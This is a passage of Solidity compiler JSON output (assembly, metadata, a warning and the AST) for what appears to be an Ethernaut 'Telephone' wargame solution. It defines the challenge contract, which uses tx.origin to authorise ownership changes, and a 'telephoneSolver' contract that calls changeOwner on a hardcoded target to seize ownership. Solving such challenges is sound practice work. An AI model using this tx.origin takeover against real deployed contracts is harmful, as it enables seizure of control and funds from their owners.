											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3595,
											"end": 3689,
											"name": "tag",
											"source": 1,
											"value": "73"
										},
										{
											"begin": 3595,
											"end": 3689,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3628,
											"end": 3636,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3676,
											"end": 3681,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3672,
											"end": 3674,
											"name": "PUSH",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 3668,
											"end": 3682,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 3647,
											"end": 3682,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3647,
											"end": 3682,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3595,
											"end": 3689,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3595,
											"end": 3689,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3595,
											"end": 3689,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3595,
											"end": 3689,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"solve()": "890d6908"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"solve\",\"outputs\":[{\"internalType\":\"bytes\",\"name\":\"\",\"type\":\"bytes\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"ethernautTelephone.sol\":\"telephoneSolver\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"ethernautTelephone.sol\":{\"keccak256\":\"0xfaec50c76ab3fc1b14214c85afe56ce0d5bc57ba2b3ddf45ca1f3a81f3202067\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://d0e397725e2a35853dab6dc6e67da630216b436305b960ad24425c143e3a03bd\",\"dweb:/ipfs/QmcjZx4m8e2Z4FZRmcMuZES4AfHji62snqHrMnnMC2t8JF\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "2462",
				"formattedMessage": "Warning: Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.\n --> ethernautTelephone.sol:8:3:\n  |\n8 |   constructor() public {\n  |   ^ (Relevant source part starts here and spans across multiple lines).\n\n",
				"message": "Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.",
				"severity": "warning",
				"sourceLocation": {
					"end": 165,
					"file": "ethernautTelephone.sol",
					"start": 113
				},
				"type": "Warning"
			}
		],
		"sources": {
			"ethernautTelephone.sol": {
				"ast": {
					"absolutePath": "ethernautTelephone.sol",
					"exportedSymbols": {
						"Telephone": [
							30
						],
						"telephoneSolver": [
							77
						]
					},
					"id": 78,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".7"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 30,
							"linearizedBaseContracts": [
								30
							],
							"name": "Telephone",
							"nameLocation": "69:9:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "8da5cb5b",
									"id": 3,
									"mutability": "mutable",
									"name": "owner",
									"nameLocation": "101:5:0",
									"nodeType": "VariableDeclaration",
									"scope": 30,
									"src": "86:20:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 2,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "86:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 11,
										"nodeType": "Block",
										"src": "134:31:0",
										"statements": [
											{
												"expression": {
													"id": 9,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 6,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "141:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 7,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "149:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 8,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"src": "149:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "141:18:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 10,
												"nodeType": "ExpressionStatement",
												"src": "141:18:0"
											}
										]
									},
									"id": 12,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 4,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "124:2:0"
									},
									"returnParameters": {
										"id": 5,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "134:0:0"
									},
									"scope": 30,
									"src": "113:52:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 28,
										"nodeType": "Block",
										"src": "215:72:0",
										"statements": [
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													},
													"id": 21,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"expression": {
															"id": 17,
															"name": "tx",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967270,
															"src": "226:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_transaction",
																"typeString": "tx"
															}
														},
														"id": 18,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "origin",
														"nodeType": "MemberAccess",
														"src": "226:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"expression": {
															"id": 19,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "239:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 20,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"src": "239:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "226:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 27,
												"nodeType": "IfStatement",
												"src": "222:60:0",
												"trueBody": {
													"id": 26,
													"nodeType": "Block",
													"src": "251:31:0",
													"statements": [
														{
															"expression": {
																"id": 24,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 22,
																	"name": "owner",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "260:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"id": 23,
																	"name": "_owner",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 14,
																	"src": "268:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"src": "260:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 25,
															"nodeType": "ExpressionStatement",
															"src": "260:14:0"
														}
													]
												}
											}
										]
									},
									"functionSelector": "a6f9dae1",
									"id": 29,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "changeOwner",
									"nameLocation": "180:11:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 15,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 14,
												"mutability": "mutable",
												"name": "_owner",
												"nameLocation": "200:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 29,
												"src": "192:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 13,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "192:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "191:16:0"
									},
									"returnParameters": {
										"id": 16,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "215:0:0"
									},
									"scope": 30,
									"src": "171:116:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 78,
							"src": "60:230:0",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 77,
							"linearizedBaseContracts": [
								77
							],
							"name": "telephoneSolver",
							"nameLocation": "303:15:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 75,
										"nodeType": "Block",
										"src": "377:437:0",
										"statements": [
											{
												"assignments": [
													36
												],
												"declarations": [
													{
														"constant": false,
														"id": 36,
														"mutability": "mutable",
														"name": "contractAddr",
														"nameLocation": "396:12:0",
														"nodeType": "VariableDeclaration",
														"scope": 75,
														"src": "388:20:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 35,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "388:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 41,
												"initialValue": {
													"arguments": [
														{
															"hexValue": "307830336362454437303339624441366165343532334336453742423635373937313841353834663833",
															"id": 39,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "419:42:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"value": "0x03cbED7039bDA6ae4523C6E7BB6579718A584f83"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 38,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "411:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_$",
															"typeString": "type(address)"
														},
														"typeName": {
															"id": 37,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "411:7:0",
															"typeDescriptions": {}
														}
													},
													"id": 40,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "411:51:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "388:74:0"
											},
											{
												"assignments": [
													43,
													45
												],
												"declarations": [
													{
														"constant": false,
														"id": 43,
														"mutability": "mutable",
														"name": "success",
														"nameLocation": "479:7:0",
														"nodeType": "VariableDeclaration",
														"scope": 75,
														"src": "474:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 42,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "474:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 45,
														"mutability": "mutable",
														"name": "reason",
														"nameLocation": "501:6:0",
														"nodeType": "VariableDeclaration",
														"scope": 75,
														"src": "488:19:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 44,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "488:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 65,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"arguments": [
																				{
																					"hexValue": "6368616e67654f776e6572286164647265737329",
																					"id": 56,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "string",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "592:22:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_stringliteral_a6f9dae13f6f9f7de69814715796059e291f78e951670d244dd3b07111b8bb18",
																						"typeString": "literal_string \"changeOwner(address)\""
																					},
																					"value": "changeOwner(address)"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_stringliteral_a6f9dae13f6f9f7de69814715796059e291f78e951670d244dd3b07111b8bb18",
																						"typeString": "literal_string \"changeOwner(address)\""
																					}
																				],
																				"id": 55,
																				"name": "keccak256",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 4294967288,
																				"src": "582:9:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																					"typeString": "function (bytes memory) pure returns (bytes32)"
																				}
																			},
																			"id": 57,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "582:33:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		],
																		"id": 54,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "575:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes4_$",
																			"typeString": "type(bytes4)"
																		},
																		"typeName": {
																			"id": 53,
																			"name": "bytes4",
																			"nodeType": "ElementaryTypeName",
																			"src": "575:6:0",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 58,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "575:41:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes4",
																		"typeString": "bytes4"
																	}
																},
																{
																	"arguments": [
																		{
																			"hexValue": "307837393833343945303663363732373234363531323342393162643838433564313962386337383738",
																			"id": 61,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "640:42:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			},
																			"value": "0x798349E06c67272465123B91bd88C5d19b8c7878"
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 60,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "632:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 59,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "632:7:0",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 62,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "632:51:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bytes4",
																		"typeString": "bytes4"
																	},
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"id": 51,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967295,
																	"src": "544:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 52,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodePacked",
																"nodeType": "MemberAccess",
																"src": "544:16:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function () pure returns (bytes memory)"
																}
															},
															"id": 63,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "544:150:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_bytes_memory_ptr",
																	"typeString": "bytes memory"
																}
															],
															"expression": {
																"id": 46,
																"name": "contractAddr",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 36,
																"src": "511:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 47,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "call",
															"nodeType": "MemberAccess",
															"src": "511:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
															}
														},
														"id": 50,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"gas"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 48,
																	"name": "gasleft",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967289,
																	"src": "533:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_gasleft_view$__$returns$_t_uint256_$",
																		"typeString": "function () view returns (uint256)"
																	}
																},
																"id": 49,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "533:9:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"src": "511:32:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$gas",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 64,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "511:184:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "473:222:0"
											},
											{
												"condition": {
													"id": 66,
													"name": "success",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 43,
													"src": "709:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 73,
													"nodeType": "Block",
													"src": "772:35:0",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 70,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
																	"referencedDeclaration": 4294967277,
																	"src": "787:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 71,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "787:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 72,
															"nodeType": "ExpressionStatement",
															"src": "787:8:0"
														}
													]
												},
												"id": 74,
												"nodeType": "IfStatement",
												"src": "706:101:0",
												"trueBody": {
													"id": 69,
													"nodeType": "Block",
													"src": "717:40:0",
													"statements": [
														{
															"expression": {
																"id": 67,
																"name": "reason",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 45,
																"src": "739:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes_memory_ptr",
																	"typeString": "bytes memory"
																}
															},
															"functionReturnParameters": 34,
															"id": 68,
															"nodeType": "Return",
															"src": "732:13:0"
														}
													]
												}
											}
										]
									},
									"functionSelector": "890d6908",
									"id": 76,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "solve",
									"nameLocation": "337:5:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "342:2:0"
									},
									"returnParameters": {
										"id": 34,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 33,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 76,
												"src": "363:12:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_memory_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 32,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "363:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "362:14:0"
									},
									"scope": 77,
									"src": "328:486:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 78,
							"src": "294:523:0",
							"usedErrors": []
						}
					],
					"src": "33:786:0"
				},
				"id": 0
			}
		}
	}
}